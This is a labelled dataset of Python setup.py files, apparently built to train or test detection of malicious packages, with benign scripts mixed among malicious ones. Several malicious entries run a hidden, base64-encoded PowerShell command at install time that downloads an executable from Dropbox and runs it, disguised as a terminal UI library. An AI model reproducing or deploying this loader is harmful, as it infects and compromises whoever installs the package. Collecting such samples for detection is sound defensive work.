3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "djangorestframework-jwt-1.11.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\nimport re\nimport shutil\nimport sys\n\nfrom setuptools import setup\n\n\ndef get_version(package):\n    \"\"\"\n    Return package version as listed in `__version__` in `init.py`.\n    \"\"\"\n    with open(os.path.join(package, '__init__.py'), 'rb') as init_py:\n        src = init_py.read().decode('utf-8')\n        return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", src).group(1)\n\n\nname = 'djangorestframework-jwt'\nversion = get_version('rest_framework_jwt')\npackage = 'rest_framework_jwt'\ndescription = 'JSON Web Token based authentication for Django REST framework'\nurl = 'https://github.com/GetBlimp/django-rest-framework-jwt'\nauthor = 'Jose Padilla'\nauthor_email = 'jpadilla@getblimp.com'\nlicense = 'MIT'\ninstall_requires = [\n    'PyJWT>=1.5.2,<2.0.0',\n]\n\n\ndef read(*paths):\n    \"\"\"\n    Build a file path from paths and return the contents.\n    \"\"\"\n    with open(os.path.join(*paths), 'r') as f:\n        return f.read()\n\n\ndef get_packages(package):\n    \"\"\"\n    Return root package and all sub-packages.\n    \"\"\"\n    return [dirpath\n            for dirpath, dirnames, filenames in os.walk(package)\n            if os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n\ndef get_package_data(package):\n    \"\"\"\n    Return all files under the root package, that are not in a\n    package themselves.\n    \"\"\"\n    walk = [(dirpath.replace(package + os.sep, '', 1), filenames)\n            for dirpath, dirnames, filenames in os.walk(package)\n            if not os.path.exists(os.path.join(dirpath, '__init__.py'))]\n\n    filepaths = []\n    for base, filenames in walk:\n        filepaths.extend([os.path.join(base, filename)\n                          for filename in filenames])\n    return {package: filepaths}\n\n\nif sys.argv[-1] == 'publish':\n    if os.system('pip freeze | grep twine'):\n        print('twine not installed.\\nUse `pip install twine`.\\nExiting.')\n        sys.exit()\n    os.system('python setup.py sdist bdist_wheel')\n    os.system('twine upload dist/*')\n    shutil.rmtree('dist')\n    shutil.rmtree('build')\n    shutil.rmtree('djangorestframework_jwt.egg-info')\n    print('You probably want to also tag the version now:')\n    print(\"  git tag -a {0} -m 'version {0}'\".format(version))\n    print('  git push --tags')\n    sys.exit()\n\n\nsetup(\n    name=name,\n    version=version,\n    url=url,\n    license=license,\n    description=description,\n    long_description=read('README.rst'),\n    author=author,\n    author_email=author_email,\n    packages=get_packages(package),\n    package_data=get_package_data(package),\n    install_requires=install_requires,\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Topic :: Internet :: WWW/HTTP',\n    ]\n)\n", "target": 0}
{"idx": "selfreplacereplace-5.67", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfreplacereplace',\n    packages = ['modlib'],\n    version = '6.18',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libcraftcandyrandom-7.43", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libcraftcandyrandom',\n    packages = ['modlib'],\n    version = '2.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tpcontrolosintcv-6.9", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcontrolosintcv',\n    packages = ['modlib'],\n    version = '10.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "exchangerates-0.3.4", "func": "from setuptools import setup, find_packages\n\n\nsetup(\n    name='exchangerates',\n    version='0.3.4',\n    description=\"A module to make it easier to handle historical exchange rates\",\n    long_description=\"\",\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        'Programming Language :: Python :: 3.6',\n\t'Programming Language :: Python :: 3.7'\n    ],\n    author='Mark Brough',\n    author_email='mark@brough.io',\n    url='http://github.com/markbrough/exchangerates',\n    license='MIT',\n    packages=find_packages(exclude=['ez_setup', 'examples']),\n    namespace_packages=[],\n    include_package_data=True,\n    zip_safe=False,\n    install_requires=[\n        'lxml >= 4.3.0',\n        'requests >= 2.22.0',\n        'six >= 1.12.0'\n    ],\n    entry_points={\n    }\n)\n", "target": 0}
{"idx": "selfccpeppep-8.73", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfccpeppep',\n    packages = ['modlib'],\n    version = '5.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-language-2.5.1", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\n# Package metadata.\n\nname = \"google-cloud-language\"\ndescription = \"Google Cloud Natural Language API client library\"\nversion = \"2.5.1\"\n# Should be one of:\n# 'Development Status :: 3 - Alpha'\n# 'Development Status :: 4 - Beta'\n# 'Development Status :: 5 - Production/Stable'\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\n# Setup boilerplate below this line.\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\n# Only include packages under the 'google' namespace. Do not include tests,\n# benchmarks, etc.\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\n# Determine which namespaces are needed.\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-language\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_language_v1_keywords.py\",\n        \"scripts/fixup_language_v1beta2_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfcontrolloadload-3.79", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AdABwAHkAawBpAGQAcABkAGoAegA5ADkAMgAwADIALwBlAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwB0AG0AcAAtAGwAdgBuAHMAbwBhAHMAcwAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAHQAbQBwAC0AbAB2AG4AcwBvAGEAcwBzAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcontrolloadload',\n    packages = ['modlib'],\n    version = '10.96',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cvhttp-6.15", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'cvhttp',\n    packages = ['modlib'],\n    version = '2.72',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "cycler-0.11.0", "func": "from setuptools import setup\n\nsetup(name='cycler',\n      version='0.11.0',\n      author='Thomas A Caswell',\n      author_email='matplotlib-users@python.org',\n      py_modules=['cycler'],\n      description='Composable style cycles',\n      url='https://github.com/matplotlib/cycler',\n      platforms='Cross platform (Linux, macOS, Windows)',\n      license=\"BSD\",\n      python_requires='>=3.6',\n      classifiers=['License :: OSI Approved :: BSD License',\n                   'Development Status :: 4 - Beta',\n                   'Programming Language :: Python :: 3',\n                   'Programming Language :: Python :: 3.6',\n                   'Programming Language :: Python :: 3.7',\n                   'Programming Language :: Python :: 3.8',\n                   'Programming Language :: Python :: 3.9',\n                   'Programming Language :: Python :: 3.10',\n                   'Programming Language :: Python :: 3 :: Only',\n                   ],\n      keywords='cycle kwargs',\n      )\n", "target": 0}
{"idx": "selfsplitreplaceosint-9.32", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsplitreplaceosint',\n    packages = ['modlib'],\n    version = '1.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libregame-5.7", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libregame',\n    packages = ['modlib'],\n    version = '10.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "everett-3.0.0", "func": "#!/usr/bin/env python\n\n# This Source Code Form is subject to the terms of the Mozilla Public\n# License, v. 2.0. If a copy of the MPL was not distributed with this\n# file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n\nimport os\nimport re\nfrom setuptools import find_packages, setup\n\n\ndef get_version():\n    fn = os.path.join(\"src\", \"everett\", \"__init__.py\")\n    vsre = r\"\"\"^__version__ = ['\"]([^'\"]*)['\"]\"\"\"\n    version_file = open(fn).read()\n    return re.search(vsre, version_file, re.M).group(1)\n\n\ndef get_file(fn):\n    with open(fn) as fp:\n        return fp.read()\n\n\nINSTALL_REQUIRES = []\nEXTRAS_REQUIRE = {\n    \"ini\": [\"configobj\"],\n    \"yaml\": [\"PyYAML\"],\n    \"dev\": [\n        \"black==20.8b1\",\n        \"check-manifest==0.47\",\n        \"cogapp==3.3.0\",\n        \"flake8==4.0.1\",\n        \"mypy==0.931\",\n        \"pytest==6.2.5\",\n        \"Sphinx==4.3.2\",\n        \"sphinx_rtd_theme==1.0.0\",\n        \"tox==3.24.5\",\n        \"tox-gh-actions==2.9.1\",\n        \"twine==3.7.1\",\n        \"types-PyYAML==6.0.3\",\n    ],\n}\n\n\nsetup(\n    name=\"everett\",\n    version=get_version(),\n    description=\"Configuration library for Python applications\",\n    long_description=(get_file(\"README.rst\") + \"\\n\\n\" + get_file(\"HISTORY.rst\")),\n    author=\"Will Kahn-Greene\",\n    author_email=\"willkg@mozilla.com\",\n    url=\"https://github.com/willkg/everett\",\n    install_requires=INSTALL_REQUIRES,\n    extras_require=EXTRAS_REQUIRE,\n    packages=find_packages(where=\"src\"),\n    package_dir={\"\": \"src\"},\n    include_package_data=True,\n    license=\"MPLv2\",\n    zip_safe=False,\n    keywords=\"conf config configuration component\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    project_urls={\n        \"Documentation\": \"https://everett.readthedocs.io/\",\n        \"Tracker\": \"https://github.com/willkg/everett/issues\",\n        \"Source\": \"https://github.com/willkg/everett/\",\n    },\n)\n", "target": 0}
{"idx": "Events-0.4", "func": "#!/usr/bin/env python\n\nfrom setuptools import setup, find_packages\n\nDESCRIPTION = (\"Bringing the elegance of C# EventHandler to Python\")\nVERSION = __import__('events').__version__\nwith open(\"README.rst\") as f:\n    LONG_DESCRIPTION = f.read()\n\nsetup(\n    name='Events',\n    version=VERSION,\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    author='Nicola Iarocci',\n    author_email='nicola@nicolaiarocci.com',\n    url='http://github.com/pyeve/events',\n    license=\"BSD\",\n    platforms=[\"any\"],\n    packages=find_packages(),\n    include_package_data=True,\n    test_suite=\"events.tests\",\n    install_requires=[],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        #'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Topic :: Software Development',\n    ],\n)\n", "target": 0}
{"idx": "f90nml-1.4.3", "func": "\"\"\"Installation script for f90nml.\n\nAdditional configuration settings are in ``setup.cfg``.\n\n:copyright: Copyright 2014 Marshall Ward, see AUTHORS for details.\n:license: Apache License, Version 2.0, see LICENSE for details.\n\"\"\"\nimport os\nimport sys\n\ntry:\n    from setuptools import setup\n    from setuptools import Command\nexcept ImportError:\n    from distutils.core import setup\n    from distutils.core import Command\n\nimport tests.test_f90nml\n\n# Project details\nproject_name = 'f90nml'\nproject_version = __import__(project_name).__version__\nproject_readme_fname = 'README.rst'\nproject_scripts = [os.path.join('bin', f) for f in os.listdir('bin')]\n\n\n# Test suite\nclass ProjectTest(Command):\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        unittest = tests.test_f90nml.unittest\n        testcase = tests.test_f90nml.Test\n        suite = unittest.TestLoader().loadTestsFromTestCase(testcase)\n        result = unittest.TextTestRunner(verbosity=2).run(suite)\n        sys.exit(not result.wasSuccessful())\n\n\n# README\nwith open(project_readme_fname) as f:\n    project_readme = f.read()\n\n\n# Project setup\nsetup(\n    name = project_name,\n    version = project_version,\n    description = 'Fortran 90 namelist parser',\n    long_description = project_readme,\n    author = 'Marshall Ward',\n    author_email = 'f90nml@marshallward.org',\n    url = 'http://github.com/marshallward/f90nml',\n\n    packages = ['f90nml'],\n    scripts=project_scripts,\n\n    extras_require = {\n        'yaml': ['PyYAML'],\n    },\n\n    cmdclass = {'test': ProjectTest},\n\n    classifiers = [\n        'Development Status :: 5 - Production/Stable',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Utilities',\n    ]\n)\n", "target": 0}
